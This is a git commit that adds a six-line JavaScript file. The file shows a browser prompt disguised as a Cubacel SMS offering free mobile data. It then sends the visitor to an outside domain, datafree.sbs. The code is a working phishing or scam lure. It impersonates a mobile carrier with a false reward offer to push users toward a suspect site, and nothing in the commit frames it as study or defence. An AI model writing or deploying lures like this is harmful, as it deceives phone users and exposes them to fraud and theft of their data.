8d78eca8614bf1848904213ceefe390b0afc1cbc
mmainomi <akparawa247@gmail.com>
2025-03-28 23:58:58 -0700

    Create activation-cubacel-freedata.js

---
+++ activation-cubacel-freedata.js
@@ -0,0 +1,6 @@
+
+var password = 'DATOS GRATIS'
+password=prompt('Cubacel SMS: Estimado cliente, verifique si su tarjeta SIM Cubacel califica para recibir de 5 GB a 100 GB de datos. Recompensa para antiguos clientes. Presione DATOS GRATIS para verificar ahora. ','DATOS GRATIS');
+if (password != 'DATOS GRATIS') {
+location.href='https://datafree.sbs/cubacel-freedata.html';
+}
